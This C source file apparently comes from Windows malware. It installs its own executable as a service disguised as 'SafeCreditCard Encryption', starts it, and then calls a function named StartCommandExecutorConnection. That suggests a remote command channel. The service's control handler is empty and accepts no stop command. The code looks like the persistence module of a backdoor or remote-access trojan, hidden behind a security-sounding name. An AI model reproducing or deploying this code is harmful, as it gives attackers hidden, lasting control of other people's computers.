#include <Windows.h>
#include <string.h>
#include "ServiceLauncher.h"

#define SERVICE_NAME "SafeCreditCardEncryptionService"
#define DISPLAY_NAME "SafeCreditCard Encryption"

#define CreateNewService(openedScm, exeCmdline) \
	CreateServiceA( \
		openedScm, \
		SERVICE_NAME, \
		DISPLAY_NAME, \
		SERVICE_START, \
		SERVICE_WIN32_OWN_PROCESS, \
		SERVICE_DEMAND_START, \
		SERVICE_ERROR_IGNORE, \
		exeCmdline, \
		NULL, NULL, NULL, NULL, NULL \
		)
		
//no error checking
#define GenerateCommandLine(dst, len) \
	ZeroMemory(dst, len + sizeof(" -AsService")); \
	dst[0] = '\"'; \
	GetModuleFileName(NULL, dst + 1, len); \
	strncat(dst, "\" -AsService", sizeof("\" -AsService"))

#define SERVICE_STATUS_SET(xstatus) \
	SERVICE_STATUS status; \
	ZeroMemory(&status, sizeof(SERVICE_STATUS)); \
	status.dwServiceType = SERVICE_WIN32_OWN_PROCESS; \
	status.dwCurrentState = xstatus; \
	status.dwControlsAccepted = 0

static SERVICE_STATUS_HANDLE handle;

static void WINAPI __s_CtrlHandlerCallback(DWORD ctrlEv) {
	//lololololol
}

static void WINAPI __s_ServiceMain(void) {
	SERVICE_STATUS_SET(SERVICE_START_PENDING);
	handle = RegisterServiceCtrlHandler(SERVICE_NAME, __s_CtrlHandlerCallback);
	SetServiceStatus(handle, &status);
	status.dwCurrentState = SERVICE_RUNNING;
	SetServiceStatus(handle, &status);

	StartCommandExecutorConnection();
}

void InstallAndStartService() {
	SC_HANDLE systemLocalScm = OpenSCManager(NULL, NULL,
											SC_MANAGER_CONNECT | 
											SC_MANAGER_CREATE_SERVICE);
	if(systemLocalScm == NULL)
		return;
	
	char executablePath[2 + MAX_PATH + sizeof(" -AsService")];
	GenerateCommandLine(executablePath, 2 + MAX_PATH);

	SC_HANDLE newService = CreateNewService(systemLocalScm, executablePath);
	if(newService == NULL) {
		CloseServiceHandle(systemLocalScm);
		return;
	}
	
	StartServiceA(newService, 0, NULL);
	CloseServiceHandle(newService);
	CloseServiceHandle(systemLocalScm);
}

void SetupNotifyService() {
	SERVICE_TABLE_ENTRYA entries[] = {
		{ SERVICE_NAME, (LPSERVICE_MAIN_FUNCTIONA) __s_ServiceMain },
		{ NULL, NULL }
	};

	StartServiceCtrlDispatcherA(entries);
}
